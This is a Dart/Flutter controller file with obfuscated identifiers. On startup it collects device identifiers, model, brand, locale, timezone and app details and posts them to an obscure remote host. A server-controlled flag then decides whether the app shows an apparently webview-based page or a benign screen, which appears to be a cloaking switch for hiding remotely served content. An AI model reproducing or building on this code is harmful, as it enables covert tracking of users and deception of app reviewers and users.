import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var fmztsr = RxBool(false);
  var kycbgzs = RxBool(true);
  var casht = RxString("");
  var jamir = RxBool(false);
  var feil = RxBool(true);
  final qczjsx = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    jlvmn();
  }


  Future<void> jlvmn() async {

    jamir.value = true;
    feil.value = true;
    kycbgzs.value = false;

    qczjsx.post("https://aii.kuiove.xyz/ofaxdrzenqimhvjlusytpgbkcw",data: await jrfhxoq()).then((value) {
      var zbcir = value.data["zbcir"] as String;
      var lajcpi = value.data["lajcpi"] as bool;
      if (lajcpi) {
        casht.value = zbcir;
        madeline();
      } else {
        grady();
      }
    }).catchError((e) {
      kycbgzs.value = true;
      feil.value = true;
      jamir.value = false;
    });
  }

  Future<Map<String, dynamic>> jrfhxoq() async {
    final DeviceInfoPlugin honbeaxs = DeviceInfoPlugin();
    PackageInfo sbprmh_xakzcy = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var emplcka = Platform.localeName;
    var iezdl = currentTimeZone;

    var yzgfxtbc = sbprmh_xakzcy.packageName;
    var gqfuo = sbprmh_xakzcy.version;
    var wlhmjz = sbprmh_xakzcy.buildNumber;

    var ymwf = sbprmh_xakzcy.appName;
    var burniceSwaniawski = "";
    var rdvxon = "";
    var vuhdgq = "";
    var jfpaydz  = "";
    var travisCrooks = "";
    var waldoSchumm = "";


    var lhgnuw = "";
    var onmesgjd = false;

    if (GetPlatform.isAndroid) {
      lhgnuw = "android";
      var hvamdtnu = await honbeaxs.androidInfo;

      rdvxon = hvamdtnu.brand;

      vuhdgq  = hvamdtnu.model;
      jfpaydz = hvamdtnu.id;

      onmesgjd = hvamdtnu.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lhgnuw = "ios";
      var ykvtdgw = await honbeaxs.iosInfo;
      rdvxon = ykvtdgw.name;
      vuhdgq = ykvtdgw.model;

      jfpaydz = ykvtdgw.identifierForVendor ?? "";
      onmesgjd  = ykvtdgw.isPhysicalDevice;
    }
    var res = {
      "wlhmjz": wlhmjz,
      "gqfuo": gqfuo,
      "emplcka": emplcka,
      "burniceSwaniawski" : burniceSwaniawski,
      "yzgfxtbc": yzgfxtbc,
      "vuhdgq": vuhdgq,
      "iezdl": iezdl,
      "rdvxon": rdvxon,
      "travisCrooks" : travisCrooks,
      "ymwf": ymwf,
      "jfpaydz": jfpaydz,
      "lhgnuw": lhgnuw,
      "onmesgjd": onmesgjd,
      "waldoSchumm" : waldoSchumm,

    };
    return res;
  }

  Future<void> grady() async {
    Get.offAllNamed("/consumption_tab");
  }

  Future<void> madeline() async {
    Get.offAllNamed("/consumption_fix");
  }
}
